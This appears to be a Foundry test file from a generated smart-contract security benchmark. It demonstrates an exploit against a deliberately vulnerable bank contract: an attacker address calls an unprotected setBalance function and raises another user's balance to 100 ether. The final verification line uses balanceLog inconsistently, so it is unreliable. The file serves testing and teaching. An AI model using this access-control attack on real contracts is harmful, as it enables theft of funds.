// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "./basetest.sol";
import "../src/f786f50c-f847-4c8e-bed3-41049160b00d_VulnerableBank.sol";

contract ExploitTest is BaseTestWithBalanceLog {
    address attacker = address(0xBAD);
    VulnerableBank target;

    function setUp() public override {
        target = new VulnerableBank();
        
        vm.deal(attacker, 10 ether);
    }

    function testExploit() public balanceLog {
        // Create user account
        address user = address(2);
        vm.label(user, "user");

        // Demonstrate normal behavior
        target.deposit{value: 10 ether}(user);
        assertEq(target.balances(user), 10 ether);

        // Attack by setting other's balance
        vm.startPrank(attacker); // Impersonate the attacker
        target.setBalance(user, 100 ether);
        vm.stopPrank();

        // Validation
        assertEq(target.balances(user), 100 ether);

        // Verification using log (assuming balanceLog is implemented and working)
        balanceLog.requireBalance(address(2), 100 ether, "User balance after attack must be 100 ether");
    }
}